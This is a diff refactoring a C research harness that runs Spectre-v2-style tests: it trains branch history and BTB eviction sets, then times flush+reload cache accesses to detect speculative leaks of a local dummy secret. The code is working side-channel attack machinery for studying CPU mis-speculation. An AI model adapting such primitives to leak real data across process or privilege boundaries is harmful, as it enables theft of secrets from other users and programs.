@@ -4,42 +4,19 @@
 #include "sc_utils.h"
 #include "inline_asm.h"
 
+void init_btb_targets();
+void walk_btb_evset();
+void init_env();
+void print_result();
+void free_env();
+
+#define NR_TEST_ITER 64
 #define LEN_BH_CHAIN 8
 #define NR_BCOND_TRAIN 512
-#define NR_TEST_ITER 64
 
 #define NR_BST_TRAIN 2
 #define NR_BTB_EVICT_VICTIM 1
-// #define NR_BTB_EVICT_VICTIM 2
 #define SZ_BTB_EVSET 2
-
-enum test_type {
-    TEST_SPEC_V2,
-    TEST_SPEC_NO_BSE,
-    TEST_SPEC_BSE,
-    NR_TESTS,
-};
-
-typedef struct {
-    branch_chain_t bh_chain;
-    void *ib_target;
-    uint64_t *bh_targets;
-    uint64_t nr_cond_bh;
-    void **ib_ptr_ptr;
-    char *frbuf;
-    char *ptr_secret;
-} bh_chain_params_t;
-
-typedef struct {
-    enum test_type test_spec;
-    uint64_t nr_test_passes;
-    uint64_t nr_train_passes;
-    uint64_t nr_trains;
-    bh_chain_params_t** trains;
-    bh_chain_params_t* test;
-    void (*before_train)(void);
-    void (*before_test)(void);
-} test_obj_t;
 
 __attribute__((aligned(4096)))
 uint64_t *res_cycles[NR_TESTS];
@@ -55,10 +32,6 @@ __attribute__((aligned(4096)))
 void *ib_ptr = &t_leak;
 
 __attribute__((aligned(4096)))
-// static uint64_t offets_btb_victim[NR_BTB_EVICT_VICTIM] = {0xe0};
-// static uint64_t offsets_bh_leak[LEN_BH_CHAIN + 1] = {0x00, 0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, -1};
-// static uint64_t offsets_bh_safe[LEN_BH_CHAIN + 1] = {0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0xe0, -1};
-
 static uint64_t offets_btb_victim[NR_BTB_EVICT_VICTIM] = {0x100};
 static uint64_t offsets_bh_leak[LEN_BH_CHAIN + 1] = {0x00, 0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x00, -1};
 static uint64_t offsets_bh_safe[LEN_BH_CHAIN + 1] = {0x20, 0x40, 0x60, 0x80, 0xa0, 0xc0, 0x100, 0xe0, -1};
@@ -66,39 +39,80 @@ static uint64_t offsets_btb_train[NR_BST_TRAIN] = {0x10, 0x20};
 static uint64_t btb_evset_base[SZ_BTB_EVSET] = {0x8000000, 0x9000000};
 static uint8_t dummy_secret = 12;
 
-void init_trampolines()
-{
-    tramp_ret = prep_trampoline(&jit_ret_obj, &jit_nop_obj, 16, 0, BASE_RET_MEM, 0x1000);
-    tramp_br = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, BASE_BHB_POPULATE, 0x1000);
-    tramp_btb_evset = malloc(SZ_BTB_EVSET * sizeof(trampoline_obj_t *));
-    for (int i = 0; i < SZ_BTB_EVSET; i++)
-    {
-        tramp_btb_evset[i] = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, (void *)btb_evset_base[i], 0x1000);
-    }
-}
+branch_chain_t bh_chain_common;
 
-void compile_br_targets()
-{
-    targets_bh_leak = prep_jmp_targets(offsets_bh_leak, LEN_BH_CHAIN, *tramp_br);
-    targets_bh_leak[LEN_BH_CHAIN] = (uint64_t)&asm_br;
-    targets_bh_safe = prep_jmp_targets(offsets_bh_safe, LEN_BH_CHAIN, *tramp_br);
-    targets_bh_safe[LEN_BH_CHAIN] = (uint64_t)&asm_br;
+static bh_chain_params_t chain_leak = {
+    .bh_chain_p = &bh_chain_common,
+    .ib_target = &t_leak,
+    .bh_targets_p = &targets_bh_leak,
+    .nr_cond_bh = COND_FP_BITS,
+    .ib_ptr_p = &ib_ptr,
+    .frbuf_p = &frbuf,
+    .ptr_secret = &dummy_secret
+};
 
-    targets_btb_train = prep_jmp_targets(offsets_btb_train, NR_BST_TRAIN, *tramp_ret);
-    targets_btb_evset = malloc(SZ_BTB_EVSET * sizeof(uint64_t *));
-    for (int i = 0; i < SZ_BTB_EVSET; i++)
-    {
-        targets_btb_evset[i] = prep_jmp_targets(offets_btb_victim, NR_BTB_EVICT_VICTIM, *tramp_btb_evset[i]);
-    }
-}
+static bh_chain_params_t chain_safe = {
+    .bh_chain_p = &bh_chain_common,
+    .ib_target = &t_empty,
+    .bh_targets_p = &targets_bh_safe,
+    .nr_cond_bh = COND_FP_BITS,
+    .ib_ptr_p = &ib_ptr,
+    .frbuf_p = &frbuf,
+    .ptr_secret = &dummy_secret
+};
+
+static bh_chain_params_t chain_mispred = {
+    .bh_chain_p = &bh_chain_common,
+    .ib_target = &t_empty,
+    .bh_targets_p = &targets_bh_leak,
+    .nr_cond_bh = COND_FP_BITS,
+    .ib_ptr_p = &ib_ptr,
+    .frbuf_p = &frbuf,
+    .ptr_secret = &dummy_secret
+};
+
+static bh_chain_params_t *train_passes[2] = {&chain_leak, &chain_safe};
+
+static test_obj_t test_spec_specv2 = {
+    .test_spec = TEST_SPEC_V2,
+    .nr_test_passes = NR_TEST_ITER,
+    .nr_train_passes = 2,
+    .nr_trains = 1,
+    .trains = (bh_chain_params_t**)train_passes,
+    .test = &chain_mispred,
+    .before_train = &init_btb_targets,
+    .before_test = &t_empty
+};
+
+static test_obj_t test_spec_bse_no_ev = {
+    .test_spec = TEST_SPEC_NO_BSE,
+    .nr_test_passes = NR_TEST_ITER,
+    .nr_train_passes = 2,
+    .nr_trains = 1,
+    .trains = (bh_chain_params_t**)train_passes,
+    .test = &chain_safe,
+    .before_train = &init_btb_targets,
+    .before_test = &t_empty
+};
+
+static test_obj_t test_spec_bse = {
+    .test_spec = TEST_SPEC_BSE,
+    .nr_test_passes = NR_TEST_ITER,
+    .nr_train_passes = 2,
+    .nr_trains = 1,
+    .trains = (bh_chain_params_t**)train_passes,
+    .test = &chain_safe,
+    .before_train = &init_btb_targets,
+    .before_test = &walk_btb_evset
+};
 
 // TODO: rename this function
-void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_ptr, int nr_cond_bh, void* frbuf, void* ptr_secret)
+void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void* frbuf, void* ptr_secret)
 {
     // Populate BHB with conditional branches
     for (int i = 0; i < nr_cond_bh; i++) NOP(8);
     // Populate PHR with indirect branches and trains the BPU
-    br_chain(bh_targets, 0, NULL, ib_ptr_ptr, frbuf, ptr_secret);
+    br_chain(bh_targets, 0, NULL, ib_ptr_p, frbuf, ptr_secret);
 }
 
 // TODO: rename this function
@@ -142,40 +156,93 @@ void do_spectre_test(test_obj_t test_specs)
             for (int train_flow = 0; train_flow<nr_trains; train_flow++)
             {
                 bh_chain_params_t* current = trains[train_flow];
-                void **ib_ptr_ptr = current->ib_ptr_ptr;
+                void **ib_ptr_p = current->ib_ptr_p;
                 void *ib_target = current->ib_target;
-                *ib_ptr_ptr = ib_target;
+                *ib_ptr_p = ib_target;
 
-                branch_chain_t bh_chain = current->bh_chain;
-                uint64_t *bh_targets = current->bh_targets;
-                void *_frbuf = current->frbuf;
-                void *ptr_secret = current->ptr_secret;
+                branch_chain_t bh_chain = *(current->bh_chain_p);
+                uint64_t *bh_targets = *(current->bh_targets_p);
                 uint64_t nr_cond_bh = current->nr_cond_bh;
-                goto_chain(bh_chain, bh_targets, ib_ptr_ptr, nr_cond_bh, _frbuf, ptr_secret);
+                void *_frbuf = *(current->frbuf_p);
+                void *ptr_secret = current->ptr_secret;
+                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
             }
         }
+
         // Massage the BPU to a desired state
         test_specs.before_test();
-        void **ib_ptr_ptr = test->ib_ptr_ptr;
+        void **ib_ptr_p = test->ib_ptr_p;
         void *ib_target = test->ib_target;
-        *ib_ptr_ptr = ib_target;
+        *ib_ptr_p = ib_target;
 
         // Run the test and see if we can see the desired mis-speculation
-        branch_chain_t bh_chain = test->bh_chain;
-        uint64_t *bh_targets = test->bh_targets;
-        char *_frbuf = test->frbuf;
-        char *ptr_secret = test->ptr_secret;
+        branch_chain_t bh_chain = *(test->bh_chain_p);
+        uint64_t *bh_targets = *(test->bh_targets_p);
         uint64_t nr_cond_bh = test->nr_cond_bh;
+        char *_frbuf = *(test->frbuf_p);
+        char *ptr_secret = test->ptr_secret;
 
-        FLUSH_DCACHE(ib_ptr_ptr);
+        FLUSH_DCACHE(ib_ptr_p);
         FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, ptr_secret));
-        goto_chain(bh_chain, bh_targets, ib_ptr_ptr, nr_cond_bh, _frbuf, ptr_secret);
+        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
         
         // Decode side channel to see if we have made it!
         OPS_BARRIER(0x10);
         
         res_cycles[test_specs.test_spec][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, ptr_secret));
     }
+}
+
+int main()
+{
+    init_env();
+    do_spectre_test(test_spec_specv2);
+    do_spectre_test(test_spec_bse_no_ev);
+    do_spectre_test(test_spec_bse);
+    print_result();
+    free_env();
+    return 0;
+}
+
+void init_trampolines()
+{
+    tramp_ret = prep_trampoline(&jit_ret_obj, &jit_nop_obj, 16, 0, BASE_RET_MEM, 0x1000);
+    tramp_br = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, BASE_BHB_POPULATE, 0x1000);
+    tramp_btb_evset = malloc(SZ_BTB_EVSET * sizeof(trampoline_obj_t *));
+    for (int i = 0; i < SZ_BTB_EVSET; i++)
+    {
+        tramp_btb_evset[i] = prep_trampoline(&jit_br_and_inc_idx_obj, NULL, 0, 0, (void *)btb_evset_base[i], 0x1000);
+    }
+}
+
+void compile_br_targets()
+{
+    targets_bh_leak = prep_jmp_targets(offsets_bh_leak, LEN_BH_CHAIN, *tramp_br);
+    targets_bh_leak[LEN_BH_CHAIN] = (uint64_t)&asm_br;
+    targets_bh_safe = prep_jmp_targets(offsets_bh_safe, LEN_BH_CHAIN, *tramp_br);
+    targets_bh_safe[LEN_BH_CHAIN] = (uint64_t)&asm_br;
+
+    targets_btb_train = prep_jmp_targets(offsets_btb_train, NR_BST_TRAIN, *tramp_ret);
+    targets_btb_evset = malloc(SZ_BTB_EVSET * sizeof(uint64_t *));
+    for (int i = 0; i < SZ_BTB_EVSET; i++)
+    {
+        targets_btb_evset[i] = prep_jmp_targets(offets_btb_victim, NR_BTB_EVICT_VICTIM, *tramp_btb_evset[i]);
+    }
+}
+
+void init_env()
+{
+    init_frbuf(256, SIZE_CACHE_STRIDE);
+    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secret),NR_TEST_ITER);
+    for (int i=0; i<NR_TESTS; i++)
+    {
+        res_cycles[i] = malloc(NR_TEST_ITER * sizeof(uint64_t));
+    }
+
+    init_trampolines();
+    compile_br_targets();
+
+    bh_chain_common = (branch_chain_t)(tramp_br->jit_mem->call_entry);
 }
 
 void print_result()
@@ -229,87 +296,4 @@ void free_env()
         free_trampoline(tramp_btb_evset[i]);
     }
     free(tramp_btb_evset);
-}
-
-int main()
-{
-    init_frbuf(256, SIZE_CACHE_STRIDE);
-    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secret),NR_TEST_ITER);
-    for (int i=0; i<NR_TESTS; i++)
-    {
-        res_cycles[i] = malloc(NR_TEST_ITER * sizeof(uint64_t));
-    }
-
-    init_trampolines();
-    compile_br_targets();
-
-    branch_chain_t bh_chain = (branch_chain_t)(tramp_br->jit_mem->call_entry);
-
-    bh_chain_params_t chain_leak = {
-        .bh_chain = bh_chain,
-        .ib_target = &t_leak,
-        .bh_targets = targets_bh_leak,
-        .nr_cond_bh = NR_BCOND_TRAIN,
-        .ib_ptr_ptr = &ib_ptr,
-        .frbuf = frbuf,
-        .ptr_secret = &dummy_secret
-    };
-    bh_chain_params_t chain_safe = {
-        .bh_chain = bh_chain,
-        .ib_target = &t_empty,
-        .bh_targets = targets_bh_safe,
-        .nr_cond_bh = NR_BCOND_TRAIN,
-        .ib_ptr_ptr = &ib_ptr,
-        .frbuf = frbuf,
-        .ptr_secret = &dummy_secret
-    };
-    bh_chain_params_t chain_mispred = {
-        .bh_chain = bh_chain,
-        .ib_target = &t_empty,
-        .bh_targets = targets_bh_leak,
-        .nr_cond_bh = NR_BCOND_TRAIN,
-        .ib_ptr_ptr = &ib_ptr,
-        .frbuf = frbuf,
-        .ptr_secret = &dummy_secret
-    };
-    bh_chain_params_t *train_passes[2] = {&chain_leak, &chain_safe};
-
-    test_obj_t test_spec_specv2 = {
-        .test_spec = TEST_SPEC_V2,
-        .nr_test_passes = NR_TEST_ITER,
-        .nr_train_passes = 2,
-        .nr_trains = 1,
-        .trains = (bh_chain_params_t**)train_passes,
-        .test = &chain_mispred,
-        .before_train = &init_btb_targets,
-        .before_test = &t_empty
-    };
-    test_obj_t test_spec_bse_no_ev = {
-        .test_spec = TEST_SPEC_NO_BSE,
-        .nr_test_passes = NR_TEST_ITER,
-        .nr_train_passes = 2,
-        .nr_trains = 1,
-        .trains = (bh_chain_params_t**)train_passes,
-        .test = &chain_safe,
-        .before_train = &init_btb_targets,
-        .before_test = &t_empty
-    };
-    test_obj_t test_spec_bse = {
-        .test_spec = TEST_SPEC_BSE,
-        .nr_test_passes = NR_TEST_ITER,
-        .nr_train_passes = 2,
-        .nr_trains = 1,
-        .trains = (bh_chain_params_t**)train_passes,
-        .test = &chain_safe,
-        .before_train = &init_btb_targets,
-        .before_test = &walk_btb_evset
-    };
-    
-    do_spectre_test(test_spec_specv2);
-    do_spectre_test(test_spec_bse_no_ev);
-    do_spectre_test(test_spec_bse);
-
-    print_result();
-    free_env();
-    return 0;
 }
